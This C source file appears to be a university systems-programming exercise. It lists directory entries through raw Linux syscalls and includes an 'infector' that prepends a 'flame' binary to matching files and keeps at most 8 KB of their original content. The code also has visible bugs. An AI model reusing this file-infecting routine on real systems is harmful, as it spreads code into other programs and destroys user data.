/* TASK 2B
aviv drori */

#include "util.h"


#define SYS_EXIT 1
#define SYS_READ 3
#define SYS_WRITE 4
#define SYS_OPEN 5
#define SYS_CLOSE 6
#define SYS_LSEEK 19
#define SYS_GETDENTS 141 

#define SEEK_SET 0
#define SEEK_END 2

#define O_RDONLY 0
#define O_WRONLY 1
#define O_RDRW 2
#define O_CREATE 64
#define O_RWX 0777
#define O_APPEND 1024

#define STDIN 0
#define STDOUT 1
#define STDERR 2

#define BUFFER_SIZE 8192  /*given by instructions*/

/*DT definition (from dirent.h)*/
# define DT_UNKNOWN 0
# define DT_FIFO  1
# define DT_CHR   2
# define DT_DIR   4
# define DT_BLK   6
# define DT_REG   8
# define DT_LNK   10
# define DT_SOCK  12
# define DT_WHT   14

/* ============================================================== */

extern int system_call(int sysCall, int arg1, int arg2, int arg3);
/* this removes the error??*/

/* Struct for linux files */
typedef struct linux_dirent {
   unsigned long  ino;        /* Inode number */
   unsigned long  offset;     /* Offset to next linux_dirent */
   unsigned short len;        /* Length of this linux_dirent */
   char           name[];     /* Filename (null-terminated) */
}linux_dirent;

char* getType(char type){
  char* ret;
  if(type==DT_REG)
    ret="Regular";
  else if(type==DT_DIR)
    ret="Directory";
  else if(type==DT_FIFO)
    ret="FIFO";
  else if(type==DT_SOCK)
    ret="Socket";
  else if(type==DT_LNK)
    ret="Symbolic link";
  else if(type==DT_BLK)
    ret="Block device";
  else if(type==DT_CHR)
    ret="Char device";
  else if(type==DT_UNKNOWN)
    ret="Unknown";
  else
    ret="?";
  return ret;
}

void errorHandler(int output,char* errorMessage){
  system_call(SYS_WRITE,output,errorMessage, strlen(errorMessage));
  system_call(SYS_EXIT,0x55,0,0);
}

void printDebug(int sys_call, int return_val){
  char tab = '\t';
  char newline = '\n';
  system_call(SYS_WRITE, STDERR, "DEBUG: System call: ", 20);
  system_call(SYS_WRITE,STDERR,itoa(sys_call),strlen(itoa(sys_call)));
  system_call(SYS_WRITE,STDERR,&tab,1);
  system_call(SYS_WRITE, STDERR, " - return value: ", 17);
  system_call(SYS_WRITE,STDERR,itoa(return_val),strlen(itoa(return_val)));
  system_call(SYS_WRITE,STDERR,&newline,1);
}

void printDebugFile(linux_dirent* file){
  system_call(SYS_WRITE,STDERR,"Name: ",strlen("Name: "));
  system_call(SYS_WRITE,STDERR,file->name,strlen(file->name));
  system_call(SYS_WRITE,STDERR,"\t",1);
  system_call(SYS_WRITE,STDERR,"Length: ",strlen("Length: "));
  system_call(SYS_WRITE,STDERR,itoa(file->len),strlen(itoa(file->len)));
  system_call(SYS_WRITE,STDERR, "\n\n", 2);
}


/* FUNCTION FOR PRINTING THE FILE INFO */
int printFile(int output,linux_dirent* file,int debugFlag, char type){
  int callReturn;
  callReturn = system_call(SYS_WRITE, output, file->name, strlen(file->name));
  system_call(SYS_WRITE, output, "\tType: ", 7);
  system_call(SYS_WRITE, output, getType(type) ,strlen(getType(type)));
  system_call(SYS_WRITE, output, "\n", 1);

  if(callReturn<0){errorHandler(output,"Error in writing name of file\n");}
  if(debugFlag){printDebug(SYS_WRITE, callReturn);printDebugFile(file);}

  return file->len;
}

/* TASK 2 C ==============================================================*/
void infection(){
  system_call(SYS_WRITE, STDOUT, "Hello, infected file\n", 21);
}

void infector(char* fileName){
  /* Standard output */
  system_call(SYS_WRITE, STDOUT, "Infecting: ", 11);
  system_call(SYS_WRITE, STDOUT, fileName, strlen(fileName));
  system_call(SYS_WRITE, STDOUT, "\n", 1);

  char oldFileBuffer[BUFFER_SIZE];
  int actualSize;

  int fd, flameFile; /* file descriptors */
  fd = system_call(SYS_OPEN, fileName, O_RDRW, 0777); /*target file */
  flameFile = system_call(SYS_OPEN, "flame", O_RDONLY, 0777); /*flame File */
  actualSize = system_call(SYS_READ, fd, &oldFileBuffer, BUFFER_SIZE); /*save old file content*/
  system_call(SYS_LSEEK, fd, 0, SEEK_SET);     /* START OF FILE */
  
  /*now write the new content to the target file */
  int read;
  int write;
  char c;
  int count = 0;
  while (read = system_call(SYS_READ, flameFile, &c, 1) > 0){
    write = system_call(SYS_WRITE, fd, &c, 1);
    if (write<1){
       system_call(SYS_WRITE, STDOUT, "error infecting\ncopied: ", 24);
       system_call(SYS_WRITE, STDOUT, itoa(count), strlen(itoa(count)));
       system_call(SYS_WRITE, STDOUT, "\n", 1);
       break;
    }
    count ++;  /*for debugging, unusued */
  }

  system_call(SYS_WRITE, fd, &oldFileBuffer, actualSize); /*write back old content*/

  system_call(SYS_WRITE, STDOUT, "Infected!\n", 10);  /* Standard output */
}



/* MAIN ================================================================== */
int main (int argc , char* argv[], char* envp[]){
  system_call(SYS_WRITE, STDOUT, "Flame strikes!\n", 15);

  int output = STDOUT;
  int fd, debug, i, validArgument, dirLength;
  char buffer[BUFFER_SIZE];
  linux_dirent* file;
  debug=0;
  int prefixFlag = 0;
  char prefix;
  int attachFlag = 0;
  char attach;


  /* FLAGS =============================================================== */
  for(i = 1;i < argc; i++){
    validArgument = 0;
    if(strcmp("-D", argv[i]) == 0){  /*DEBUG flag */
      validArgument=1;
      debug=1;
    }
    if (strncmp("-p", argv[i], 2) == 0){ /*prefix flag */
      validArgument = 1;
      prefixFlag = 1;
      prefix = argv[i][2];
    }
    if (strncmp("-a", argv[i], 2) == 0){ /*attach flag */
      validArgument = 1;
      attachFlag = 1;
      attach = argv[i][2];
    }

    if (!validArgument){
      errorHandler(output,"Invalid argument given\n");
    }
  }

  if (debug && prefixFlag){
    /* debug msg of prefix given */
    system_call(SYS_WRITE, STDERR, "Prefix given: ", 14);
    system_call(SYS_WRITE, STDERR, &prefix, 1);
    system_call(SYS_WRITE, STDERR, "\n", 1);
  }

  if(prefixFlag && attachFlag){
    /* if both flags are given, msg and exit */
    system_call(SYS_WRITE, STDERR, "Cannot [-p] prefix and [-a] attach.\n", 36);
    system_call(SYS_CLOSE, STDIN,0,0);
  }

  /*MAIN PROGRAM =============================================================*/
  
  fd = system_call(SYS_OPEN,".",O_RDONLY,O_RWX);  /*Get file descriptor*/
  if(debug) {printDebug(SYS_OPEN,fd);}
  if(fd<=0) {errorHandler(output,"Error in opening directory\n");}

  dirLength = system_call(SYS_GETDENTS,fd,buffer,BUFFER_SIZE); /*get buffer of the struct of the files in the directory*/
  if(debug){printDebug(SYS_GETDENTS,dirLength);}
  if(dirLength<0){errorHandler(output,"Error in getdents system call\n");}

  i=0;
  int count = 0;
  while(i < dirLength){
    file=(linux_dirent*)(buffer+i); /*Get the next file*/
    char type = *(buffer + i + file->len - 1);

    if(strcmp(file->name,".")!=0 && strcmp(file->name,"..")!=0){ /* discarding prints of the root and the prev directory file descriptor*/
      if (prefixFlag){
        if (file->name[0] == prefix){
          printFile(output,file,debug, type);
          count++;
        }
        else{}}
      else{
        printFile(output,file,debug, type);
        count++;
      }
      if (attachFlag){
        if (file->name[0] == attach){
          infector(file->name);
          count++;
        }
      }
    }
    i=i+file->len;
  }
  if (count==0){system_call(SYS_WRITE, STDOUT, "No files were found!\n", 21);}

  /*END =======================================================================*/
  system_call(SYS_WRITE, STDOUT, "Done!\n" , 6);
  system_call(SYS_CLOSE, STDIN,0,0);
  return 0;
}
